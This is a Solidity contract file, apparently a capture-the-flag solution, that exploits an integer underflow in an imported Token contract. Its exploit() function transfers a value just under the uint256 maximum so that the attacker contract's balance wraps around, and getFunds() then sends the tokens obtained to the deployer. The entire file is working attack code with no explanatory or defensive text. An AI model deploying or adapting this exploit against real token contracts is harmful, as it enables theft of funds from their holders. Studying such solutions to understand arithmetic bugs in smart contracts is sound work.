// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Token.sol";

contract TokenOverflow {
    Token public instance;
    address public instanceAddr;
    address public owner;
    uint256 public constant overflowAmount = 10;
    uint256 public constant maxUint = type(uint256).max;
    uint256 public constant overflowValue = maxUint - overflowAmount;

    constructor(address _instanceAddr) public {
        owner = msg.sender;
        instance = Token(_instanceAddr);
        instanceAddr = _instanceAddr;
    }

    function exploit() public {
        instance.transfer(instanceAddr, overflowValue);
    }

    function getFunds() public {
        require(instance.balanceOf(address(this)) >= overflowAmount);
        instance.transfer(owner, overflowAmount);
    }
}